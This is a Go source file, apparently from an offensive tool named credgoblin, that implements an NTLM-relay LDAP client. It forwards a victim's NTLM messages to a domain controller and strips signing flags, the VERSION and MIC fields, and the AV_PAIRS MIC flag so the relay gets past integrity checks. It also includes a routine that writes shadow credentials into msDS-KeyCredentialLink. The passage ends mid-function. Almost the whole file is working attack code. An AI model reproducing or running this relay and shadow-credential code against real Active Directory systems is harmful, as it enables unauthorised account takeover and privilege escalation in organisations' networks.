package relay

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"

	ber "github.com/go-asn1-ber/asn1-ber"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// LDAPClient handles LDAP connections with NTLM authentication
type LDAPClient struct {
	targetURL   string
	logger      *output.Logger
	rawConn     net.Conn
	messageID   int64
	sicilyState int // 0=not started, 1=discovery sent, 2=negotiate sent, 3=authenticated
}

// NewLDAPClient creates a new LDAP client
func NewLDAPClient(targetURL string, logger *output.Logger) *LDAPClient {
	return &LDAPClient{
		targetURL: targetURL,
		logger:    logger,
	}
}

// Connect establishes connection to LDAP server
func (c *LDAPClient) Connect() error {
	c.logger.Debug(fmt.Sprintf("Connecting to LDAP: %s", c.targetURL))

	// Parse URL to determine if ldaps or ldap
	target := c.targetURL
	if !strings.Contains(target, "://") {
		target = "ldap://" + target
	}

	u, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("invalid LDAP URL: %w", err)
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		if u.Scheme == "ldaps" {
			host += ":636"
		} else {
			host += ":389"
		}
	}

	// Create raw TCP connection for SICILY
	var rawConn net.Conn
	if u.Scheme == "ldaps" {
		rawConn, err = tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
	} else {
		rawConn, err = net.Dial("tcp", host)
	}

	if err != nil {
		return fmt.Errorf("failed to connect to LDAP: %w", err)
	}

	c.rawConn = rawConn
	c.messageID = 1
	c.logger.Debug("Connected to LDAP server")

	return nil
}

// ForwardNegotiate forwards NTLM Type 1 message to LDAP using SASL
func (c *LDAPClient) ForwardNegotiate(type1 []byte) ([]byte, error) {
	c.logger.Debug("Forwarding NTLM Type 1 to LDAP via SASL")

	// Remove signing flags from Type 1 to prevent MIC generation
	// This is what ntlmrelayx does with --remove-mic
	modifiedType1 := c.removeSigningFlags(type1)

	// Build SASL bind request with GSS-SPNEGO mechanism
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SASL authentication with GSSAPI mechanism
	// Note: Using GSSAPI instead of GSS-SPNEGO - send raw NTLM directly
	sasl := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL")
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "GSSAPI", "Mechanism"))

	// Send modified NTLM Type 1 (without signing flags)
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(modifiedType1), "Credentials"))

	bindRequest.AppendChild(sasl)
	packet.AppendChild(bindRequest)

	// Send the packet
	if err := c.sendPacket(packet); err != nil {
		return nil, fmt.Errorf("failed to send SASL bind: %w", err)
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return nil, fmt.Errorf("failed to receive SASL response: %w", err)
	}

	c.logger.Debug("SASL bind response received")

	// Debug: print response structure
	c.logger.Debug(fmt.Sprintf("Response has %d children", len(response.Children)))
	for i, child := range response.Children {
		c.logger.Debug(fmt.Sprintf("  Child %d: Tag=%d, Class=%d, Type=%d", i, child.Tag, child.ClassType, child.TagType))
	}

	// Extract NTLM Type 2 from the response
	// Response structure: SEQUENCE -> BindResponse -> result code -> serverSaslCreds
	if len(response.Children) < 2 {
		return nil, fmt.Errorf("invalid LDAP response structure")
	}

	bindResp := response.Children[1]
	c.logger.Debug(fmt.Sprintf("BindResponse has %d children", len(bindResp.Children)))
	for i, child := range bindResp.Children {
		c.logger.Debug(fmt.Sprintf("  BindResp child %d: Tag=%d, Class=%d, Type=%d, DataLen=%d", i, child.Tag, child.ClassType, child.TagType, len(child.Data.Bytes())))
	}

	if len(bindResp.Children) < 1 {
		return nil, fmt.Errorf("invalid bind response structure")
	}

	// Check result code
	resultCode := bindResp.Children[0]
	c.logger.Debug(fmt.Sprintf("Result code: %v", resultCode.Value))

	// Extract serverSaslCreds - can be context tag 7 OR plain OCTET STRING (tag 4)
	// Some LDAP servers use different structures
	var serverCreds *ber.Packet
	for _, child := range bindResp.Children {
		// serverSaslCreds can be:
		// - Context tag 7 (0x87) - standard
		// - OCTET STRING tag 4 with context class 128 - some servers
		// - Plain OCTET STRING tag 4 with data - non-standard but seen in wild
		if child.Tag == 7 || (child.Tag == 4 && len(child.Data.Bytes()) > 0) {
			serverCreds = child
			break
		}
	}

	if serverCreds == nil {
		// No serverSaslCreds means this is likely a final error, not SASL-in-progress
		if resultCode.Value.(int64) != 0 {
			return nil, fmt.Errorf("LDAP bind failed with code: %d (no serverSaslCreds)", resultCode.Value.(int64))
		}
		return nil, fmt.Errorf("no serverSaslCreds in response")
	}

	// We have serverSaslCreds, so this is a multi-step SASL exchange
	// Result codes 14 (saslBindInProgress) or 49 (invalidCredentials during negotiation) are expected
	c.logger.Debug(fmt.Sprintf("Found serverSaslCreds with %d bytes (result code %d is expected during SASL negotiation)",
		len(serverCreds.Data.Bytes()), resultCode.Value.(int64)))

	type2Resp := serverCreds.Data.Bytes()
	c.logger.Debug(fmt.Sprintf("Received SASL response (%d bytes)", len(type2Resp)))
	c.logger.Debug(fmt.Sprintf("SASL response hex: %x", type2Resp))

	// With GSSAPI mechanism, the response is BER-encoded with structure:
	// Context tag -> "GSSAPI" string -> NTLM Type 2
	// We need to parse the BER structure to extract the NTLM
	berPacket := ber.DecodePacket(type2Resp)
	if berPacket == nil {
		return nil, fmt.Errorf("failed to decode BER packet")
	}

	// Find the NTLM payload - should be in one of the OCTET STRING children
	var ntlmData []byte
	for _, child := range berPacket.Children {
		if child.Tag == ber.TagOctetString {
			data := child.Data.Bytes()
			// Check if this is the NTLM message (starts with NTLMSSP signature)
			if len(data) >= 8 {
				ntlmSig := []byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00}
				if bytes.Equal(data[:8], ntlmSig) {
					ntlmData = data
					break
				}
			}
		}
	}

	if len(ntlmData) == 0 {
		// Check if it's an error message
		if len(type2Resp) > 0 && type2Resp[0] >= 0x20 && type2Resp[0] <= 0x7e {
			return nil, fmt.Errorf("LDAP returned error: %s", string(type2Resp))
		}
		return nil, fmt.Errorf("no NTLM Type 2 found in GSSAPI response")
	}

	c.logger.Debug(fmt.Sprintf("Extracted NTLM Type 2 (%d bytes)", len(ntlmData)))

	return ntlmData, nil
}

// ForwardAuthenticate forwards NTLM Type 3 message to LDAP
func (c *LDAPClient) ForwardAuthenticate(type3 []byte) error {
	c.logger.Debug("Forwarding NTLM Type 3 to LDAP via SASL")

	// Remove MIC and signing flags from Type 3
	// This matches what ntlmrelayx does with --remove-mic
	modifiedType3 := c.removeMICFromType3(type3)

	// Build SASL bind request with NTLM Type 3
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SASL authentication with GSSAPI mechanism
	sasl := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL")
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "GSSAPI", "Mechanism"))

	// Send modified NTLM Type 3 (without MIC and signing flags)
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(modifiedType3), "Credentials"))

	bindRequest.AppendChild(sasl)
	packet.AppendChild(bindRequest)

	// Send the packet
	if err := c.sendPacket(packet); err != nil {
		return fmt.Errorf("failed to send SASL bind with Type 3: %w", err)
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive SASL auth response: %w", err)
	}

	c.logger.Debug("SASL bind response received")

	// Check if authentication succeeded
	if len(response.Children) < 2 {
		return fmt.Errorf("invalid LDAP response structure")
	}

	bindResp := response.Children[1]
	if len(bindResp.Children) < 1 {
		return fmt.Errorf("invalid bind response structure")
	}

	// Check result code
	resultCode := bindResp.Children[0]
	if resultCode.Value.(int64) != 0 { // success = 0
		// Try to extract diagnostic message if available
		var diagMsg string
		if len(bindResp.Children) >= 3 {
			// BindResponse child 1 is matchedDN, child 2 is diagnosticMessage
			if bindResp.Children[2].Tag == ber.TagOctetString {
				diagMsg = string(bindResp.Children[2].Data.Bytes())
			}
		}

		if diagMsg != "" {
			c.logger.Error(fmt.Sprintf("LDAP error: %s", diagMsg))
		}

		// Error 49 = invalidCredentials - often due to LDAP signing/MIC validation
		if resultCode.Value.(int64) == 49 {
			return fmt.Errorf("LDAP authentication failed (code 49 - invalidCredentials). This may be due to LDAP signing requirements preventing relay, or invalid/insufficient permissions for the relayed account")
		}

		return fmt.Errorf("LDAP authentication failed with code: %d", resultCode.Value.(int64))
	}

	c.logger.Debug("SASL authentication successful")

	return nil
}

// ModifyKeyCredential adds shadow credentials to target user
func (c *LDAPClient) ModifyKeyCredential(userDN string, keyCredential []byte) error {
	c.logger.Debug(fmt.Sprintf("Adding KeyCredential to %s", userDN))

	if c.rawConn == nil {
		return fmt.Errorf("not connected to LDAP")
	}

	// Build LDAP modify request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	modifyRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 6, nil, "Modify Request")
	modifyRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, userDN, "DN"))

	changes := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Changes")

	change := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Change")
	change.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Operation (add)"))

	modification := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Modification")
	modification.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "msDS-KeyCredentialLink", "Attribute"))

	values := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSet, nil, "Values")
	values.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(keyCredential), "Value"))

	modification.AppendChild(values)
	change.AppendChild(modification)
	changes.AppendChild(change)
	modifyRequest.AppendChild(changes)
	packet.AppendChild(modifyRequest)

	// Send modify request
	if err := c.sendPacket(packet); err != nil {
		return fmt.Errorf("failed to send modify request: %w", err)
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("failed to receive modify response: %w", err)
	}

	// Check result code
	if len(response.Children) < 2 {
		return fmt.Errorf("invalid modify response structure")
	}

	modifyResponse := response.Children[1]
	if len(modifyResponse.Children) < 1 {
		return fmt.Errorf("no result code in modify response")
	}

	resultCode := modifyResponse.Children[0]
	code, ok := resultCode.Value.(int64)
	if !ok {
		return fmt.Errorf("invalid result code type")
	}

	if code != 0 {
		// Try to get error message
		errMsg := "unknown error"
		if len(modifyResponse.Children) >= 3 {
			if msg, ok := modifyResponse.Children[2].Value.(string); ok {
				errMsg = msg
			}
		}
		return fmt.Errorf("LDAP modify failed with result code %d: %s", code, errMsg)
	}

	c.logger.Debug("Successfully modified msDS-KeyCredentialLink")
	return nil
}

// Close closes the LDAP connection
func (c *LDAPClient) Close() error {
	if c.rawConn != nil {
		c.rawConn.Close()
	}
	return nil
}

// sicilyDiscovery performs SICILY package discovery
func (c *LDAPClient) sicilyDiscovery() error {
	c.logger.Debug("Sending SICILY package discovery")

	// Build SICILY discovery bind request
	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SICILY_PACKAGE_DISCOVERY: authentication choice 0xA3 with value "SICILY_PACKAGE_DISCOVERY"
	auth := ber.NewString(ber.ClassContext, ber.TypePrimitive, 3, "SICILY_PACKAGE_DISCOVERY", "Authentication")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	// Send the packet
	if err := c.sendPacket(packet); err != nil {
		return err
	}

	// Receive response
	response, err := c.receivePacket()
	if err != nil {
		return fmt.Errorf("SICILY discovery failed: %w", err)
	}

	// Parse response to check for supported auth methods
	c.logger.Debug(fmt.Sprintf("SICILY discovery response received (len=%d)", len(response.Bytes())))

	return nil
}

// sicilyNegotiate sends NTLM Type 1 in SICILY negotiate
func (c *LDAPClient) sicilyNegotiate(type1 []byte) error {
	c.logger.Debug("Sending SICILY negotiate with NTLM Type 1")

	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SICILY_NEGOTIATE: authentication choice 0xA3 with NTLM Type 1
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, 3, string(type1), "Authentication")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// sicilyReceiveChallenge receives NTLM Type 2 from SICILY response
func (c *LDAPClient) sicilyReceiveChallenge() ([]byte, error) {
	c.logger.Debug("Receiving SICILY challenge (NTLM Type 2)")

	response, err := c.receivePacket()
	if err != nil {
		return nil, err
	}

	// Navigate through BER structure to find the NTLM Type 2
	// Response structure: SEQUENCE -> BindResponse (tag 0x61) -> serverSaslCreds (tag 0x87)
	if len(response.Children) < 2 {
		return nil, fmt.Errorf("invalid SICILY response structure")
	}

	bindResponse := response.Children[1]
	if bindResponse.Tag != 1 { // BindResponse is tag 1
		return nil, fmt.Errorf("expected BindResponse, got tag %d", bindResponse.Tag)
	}

	// Find serverSaslCreds (tag 7 with context class)
	var type2 []byte
	for _, child := range bindResponse.Children {
		if child.Tag == 7 && child.ClassType == ber.ClassContext {
			type2 = child.ByteValue
			break
		}
	}

	if len(type2) == 0 {
		return nil, fmt.Errorf("no NTLM Type 2 found in SICILY response")
	}

	c.logger.Debug(fmt.Sprintf("Received NTLM Type 2 (%d bytes)", len(type2)))

	return type2, nil
}

// sicilyAuthenticate sends NTLM Type 3 in SICILY response
func (c *LDAPClient) sicilyAuthenticate(type3 []byte) error {
	c.logger.Debug("Sending SICILY authenticate with NTLM Type 3")

	packet := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Request")
	packet.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, c.messageID, "MessageID"))
	c.messageID++

	bindRequest := ber.Encode(ber.ClassApplication, ber.TypeConstructed, 0, nil, "Bind Request")
	bindRequest.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bindRequest.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "DN"))

	// SICILY_RESPONSE: authentication choice 0xA3 with NTLM Type 3
	auth := ber.Encode(ber.ClassContext, ber.TypePrimitive, 3, string(type3), "Authentication")
	bindRequest.AppendChild(auth)

	packet.AppendChild(bindRequest)

	return c.sendPacket(packet)
}

// sicilyReceiveBindResponse receives the final bind response
func (c *LDAPClient) sicilyReceiveBindResponse() error {
	c.logger.Debug("Receiving SICILY bind response")

	response, err := c.receivePacket()
	if err != nil {
		return err
	}

	// Check result code
	if len(response.Children) < 2 {
		return fmt.Errorf("invalid bind response structure")
	}

	bindResponse := response.Children[1]
	if bindResponse.Tag != 1 {
		return fmt.Errorf("expected BindResponse, got tag %d", bindResponse.Tag)
	}

	// First child should be result code
	if len(bindResponse.Children) < 1 {
		return fmt.Errorf("no result code in bind response")
	}

	resultCode := bindResponse.Children[0]
	code, ok := resultCode.Value.(int64)
	if !ok {
		return fmt.Errorf("invalid result code type")
	}

	if code != 0 {
		return fmt.Errorf("LDAP bind failed with result code: %d", code)
	}

	c.logger.Debug("SICILY bind successful")

	return nil
}

// sendPacket sends an LDAP packet
func (c *LDAPClient) sendPacket(packet *ber.Packet) error {
	data := packet.Bytes()

	c.logger.Debug(fmt.Sprintf("Sending LDAP packet hex: %x", data))

	_, err := c.rawConn.Write(data)
	if err != nil {
		return fmt.Errorf("failed to write LDAP packet: %w", err)
	}

	c.logger.Debug(fmt.Sprintf("Sent LDAP packet (%d bytes)", len(data)))

	return nil
}

// receivePacket receives an LDAP packet
func (c *LDAPClient) receivePacket() (*ber.Packet, error) {
	// Read LDAP packet from connection
	// LDAP uses BER encoding, we need to read the length first

	// Read first 2 bytes to get the tag and length indicator
	header := make([]byte, 2)
	_, err := io.ReadFull(c.rawConn, header)
	if err != nil {
		return nil, fmt.Errorf("failed to read packet header: %w", err)
	}

	// Calculate total length needed
	var length int
	if header[1] < 128 {
		// Short form
		length = int(header[1])
	} else {
		// Long form
		numBytes := int(header[1] & 0x7f)
		lengthBytes := make([]byte, numBytes)
		_, err := io.ReadFull(c.rawConn, lengthBytes)
		if err != nil {
			return nil, fmt.Errorf("failed to read length bytes: %w", err)
		}

		// Reconstruct header with length bytes
		header = append(header, lengthBytes...)

		// Calculate length
		length = 0
		for i := 0; i < numBytes; i++ {
			length = (length << 8) | int(lengthBytes[i])
		}
	}

	// Read the rest of the packet
	data := make([]byte, length)
	_, err = io.ReadFull(c.rawConn, data)
	if err != nil {
		return nil, fmt.Errorf("failed to read packet data: %w", err)
	}

	// Combine header and data
	fullPacket := append(header, data...)

	c.logger.Debug(fmt.Sprintf("Received LDAP packet (%d bytes)", len(fullPacket)))

	// Decode BER packet
	packet := ber.DecodePacket(fullPacket)

	return packet, nil
}

// wrapNTLMInSPNEGO wraps NTLM message in SPNEGO
func (c *LDAPClient) wrapNTLMInSPNEGO(ntlmMsg []byte, isType1 bool) []byte {
	if isType1 {
		// NegTokenInit for Type 1
		// Build the complete SPNEGO wrapper with proper length calculation
		mechTokenLen := len(ntlmMsg) + 2       // OCTET STRING tag + length + data
		innerSeqLen := 0x0e + mechTokenLen + 2 // mechTypes + mechToken
		outerContextLen := innerSeqLen + 2     // SEQUENCE wrapper
		totalLen := 0x08 + outerContextLen + 2 // OID + context

		result := make([]byte, 0, totalLen+2)
		result = append(result, 0x60, byte(totalLen))                                                   // Application 0
		result = append(result, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02)                         // SPNEGO OID
		result = append(result, 0xa0, byte(outerContextLen))                                            // Context 0
		result = append(result, 0x30, byte(innerSeqLen))                                                // SEQUENCE
		result = append(result, 0xa0, 0x0e)                                                             // Context 0 (mechTypes)
		result = append(result, 0x30, 0x0c)                                                             // SEQUENCE
		result = append(result, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a) // NTLMSSP OID
		result = append(result, 0xa2, byte(mechTokenLen))                                               // Context 2 (mechToken)
		result = append(result, 0x04, byte(len(ntlmMsg)))                                               // OCTET STRING
		result = append(result, ntlmMsg...)                                                             // Actual NTLM Type 1 message
		return result
	}

	// NegTokenResp for Type 3
	result := make([]byte, 0)
	result = append(result, 0xa1)                   // NegTokenResp tag
	result = append(result, byte(len(ntlmMsg)+4+2)) // length
	result = append(result, 0x30)                   // SEQUENCE
	result = append(result, byte(len(ntlmMsg)+4))   // length
	result = append(result, 0xa2)                   // responseToken tag
	result = append(result, byte(len(ntlmMsg)+2))   // length
	result = append(result, 0x04)                   // OCTET STRING
	result = append(result, byte(len(ntlmMsg)))     // length
	result = append(result, ntlmMsg...)
	return result
}

// unwrapSPNEGO extracts NTLM message from SPNEGO
func (c *LDAPClient) unwrapSPNEGO(spnego []byte) ([]byte, error) {
	// Parse SPNEGO to extract NTLM Type 2
	// This is a simplified parser - full SPNEGO parsing would use ASN.1

	// Look for NTLMSSP signature (0x4e544c4d53535000)
	ntlmSig := []byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00}

	for i := 0; i < len(spnego)-8; i++ {
		if bytes.Equal(spnego[i:i+8], ntlmSig) {
			// Found NTLMSSP signature, return from here to end
			return spnego[i:], nil
		}
	}

	return nil, fmt.Errorf("NTLMSSP signature not found in SPNEGO")
}

// removeSigningFlags removes signing-related flags from NTLM Type 1
// This prevents the client from generating a MIC in Type 3
func (c *LDAPClient) removeSigningFlags(type1 []byte) []byte {
	if len(type1) < 20 {
		return type1
	}

	// Make a copy
	modified := make([]byte, len(type1))
	copy(modified, type1)

	// Flags are at offset 12 (4 bytes, little-endian)
	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
	)

	flags := binary.LittleEndian.Uint32(modified[12:16])

	// Remove signing flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_SIGN flag from Type 1")
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
		c.logger.Debug("Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag from Type 1")
	}

	binary.LittleEndian.PutUint32(modified[12:16], flags)
	return modified
}

// removeMICFromType3 removes MIC and other problematic fields from NTLM Type 3
// This matches what ntlmrelayx does: removing VERSION and MIC fields entirely
// and adjusting all offsets in the message header
func (c *LDAPClient) removeMICFromType3(type3 []byte) []byte {
	if len(type3) < 88 {
		return type3
	}

	// Flags are at offset 60 (4 bytes)
	const (
		NTLMSSP_NEGOTIATE_SIGN        = 0x00000010
		NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
		NTLMSSP_NEGOTIATE_KEY_EXCH    = 0x40000000
		NTLMSSP_NEGOTIATE_VERSION     = 0x02000000
	)

	flags := binary.LittleEndian.Uint32(type3[60:64])

	// Remove signing and other flags
	originalFlags := flags
	if flags&NTLMSSP_NEGOTIATE_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0 {
		flags ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
	}
	if flags&NTLMSSP_NEGOTIATE_KEY_EXCH != 0 {
		flags ^= NTLMSSP_NEGOTIATE_KEY_EXCH
	}

	// Check if VERSION flag is set - if so, we need to remove VERSION and MIC fields
	hasVersion := (originalFlags & NTLMSSP_NEGOTIATE_VERSION) != 0

	if hasVersion {
		// Remove VERSION flag
		flags ^= NTLMSSP_NEGOTIATE_VERSION

		// NTLM Type 3 structure with VERSION and MIC:
		// Offset 0-7: Signature "NTLMSSP\0"
		// Offset 8-11: Message Type (0x03000000)
		// Offset 12-19: LM Response (len, maxlen, offset)
		// Offset 20-27: NTLM Response (len, maxlen, offset)
		// Offset 28-35: Domain (len, maxlen, offset)
		// Offset 36-43: User (len, maxlen, offset)
		// Offset 44-51: Workstation (len, maxlen, offset)
		// Offset 52-59: Session Key (len, maxlen, offset)
		// Offset 60-63: Flags
		// Offset 64-71: Version (8 bytes) - only if NEGOTIATE_VERSION flag set
		// Offset 72-87: MIC (16 bytes) - only if NEGOTIATE_VERSION flag set
		// Offset 88+: Variable fields (domain, user, host, LM, NTLM, session key)

		// Make a copy to work with
		modified := make([]byte, len(type3))
		copy(modified, type3)

		// Update flags first
		binary.LittleEndian.PutUint32(modified[60:64], flags)

		// Get session key info before we modify anything
		sessKeyLen := binary.LittleEndian.Uint16(modified[52:54])
		sessKeyOffset := binary.LittleEndian.Uint32(modified[56:60])
		hasSessionKey := (originalFlags&NTLMSSP_NEGOTIATE_KEY_EXCH) != 0 && sessKeyLen > 0

		// Zero out the session key length if KEY_EXCH flag was removed
		if hasSessionKey {
			// Session key descriptor is at offset 52-59
			binary.LittleEndian.PutUint16(modified[52:54], 0) // len = 0
			binary.LittleEndian.PutUint16(modified[54:56], 0) // maxlen = 0
			// offset will be adjusted below
		}

		// Calculate total bytes to skip: VERSION (8) + MIC (16) + SessionKey (variable)
		bytesToSkip := 24 // VERSION + MIC
		if hasSessionKey {
			bytesToSkip += int(sessKeyLen)
		}

		// Adjust all offsets in the header
		// Each offset field is at: [len(2) + maxlen(2) + offset(4)] = 8 bytes total
		// We need to adjust: LM, NTLM, Domain, User, Workstation, Session Key offsets
		offsetPositions := []int{16, 24, 32, 40, 48, 56} // Offset field positions

		for _, pos := range offsetPositions {
			if pos+4 <= len(modified) {
				offset := binary.LittleEndian.Uint32(modified[pos : pos+4])
				// Adjust if offset points past the VERSION/MIC fields (>= 88)
				if offset >= 88 {
					offset -= 24 // Subtract VERSION (8) + MIC (16)
					// Also subtract session key length if this offset is after the session key
					if hasSessionKey && offset >= sessKeyOffset {
						offset -= uint32(sessKeyLen)
					}
					binary.LittleEndian.PutUint32(modified[pos:pos+4], offset)
				}
			}
		}

		// Now build the final message without VERSION, MIC, and session key data
		final := make([]byte, 0, len(type3)-bytesToSkip)
		final = append(final, modified[0:64]...) // Header with adjusted offsets

		// Copy variable data, skipping VERSION, MIC, and session key
		if hasSessionKey && sessKeyOffset > 88 {
			// Session key is in the variable data section
			// Copy everything from 88 up to (but not including) the session key
			final = append(final, modified[88:sessKeyOffset]...)
			// Skip the session key data, copy everything after it
			final = append(final, modified[sessKeyOffset+uint32(sessKeyLen):]...)
		} else {
			// No session key or it's at an unexpected location, just skip VERSION/MIC
			final = append(final, modified[88:]...)
		}

		// Also need to clear the MIC Present flag in AV_PAIRS within the NTLMv2 response
		final = c.clearMICFlagInAVPairs(final)

		c.logger.Debug(fmt.Sprintf("Removed MIC, VERSION, and signing flags from Type 3, adjusted offsets (removed %d bytes total)", bytesToSkip))
		return final
	} else {
		// No VERSION field, just update flags
		modified := make([]byte, len(type3))
		copy(modified, type3)
		binary.LittleEndian.PutUint32(modified[60:64], flags)

		c.logger.Debug("Removed signing flags from Type 3 (no VERSION/MIC to remove)")
		return modified
	}
}

// clearMICFlagInAVPairs clears the MIC Present flag (0x00000002) in the AV_PAIRS
// within the NTLMv2 response blob. This is necessary because even though we remove
// the MIC field from the message, the AV_PAIRS still indicate MIC is present,
// causing the DC to reject authentication.
func (c *LDAPClient) clearMICFlagInAVPairs(type3 []byte) []byte {
	// NTLM Response descriptor is at offset 20-27
	if len(type3) < 28 {
		return type3
	}

	ntlmRespLen := binary.LittleEndian.Uint16(type3[20:22])
	ntlmRespOffset := binary.LittleEndian.Uint32(type3[24:28])

	if ntlmRespOffset+uint32(ntlmRespLen) > uint32(len(type3)) {
		c.logger.Debug("Invalid NTLM response offset/length, skipping AV_PAIRS modification")
		return type3
	}

	// NTLMv2 Response structure:
	// Offset 0-15: Response (HMAC-MD5)
	// Offset 16: RespType (0x01)
	// Offset 17: HiRespType (0x01)
	// Offset 18-19: Reserved1
	// Offset 20-23: Reserved2
	// Offset 24-31: TimeStamp
	// Offset 32-39: ChallengeFromClient
	// Offset 40-43: Reserved3
	// Offset 44+: AV_PAIRS (attribute-value pairs)

	// Make sure we have at least the header
	if ntlmRespLen < 44 {
		c.logger.Debug("NTLMv2 response too short for AV_PAIRS")
		return type3
	}

	// Make a copy to modify
	modified := make([]byte, len(type3))
	copy(modified, type3)

	// Parse AV_PAIRS starting at offset 44 within the NTLMv2 response
	avPairsStart := ntlmRespOffset + 44
	offset := avPairsStart

	for offset < ntlmRespOffset+uint32(ntlmRespLen)-4 {
		avID := binary.LittleEndian.Uint16(modified[offset : offset+2])
		avLen := binary.LittleEndian.Uint16(modified[offset+2 : offset+4])

		if avID == 0 { // MsvAvEOL
			break
		}

		// MsvAvFlags = 6
		if avID == 6 && avLen == 4 {
			flags := binary.LittleEndian.Uint32(modified[offset+4 : offset+8])
			const MIC_PRESENT = 0x00000002

			if flags&MIC_PRESENT != 0 {
				// Clear the MIC Present flag
				flags &^= MIC_PRESENT
				binary.LittleEndian.PutUint32(modified[offset+4:offset+8], flags)
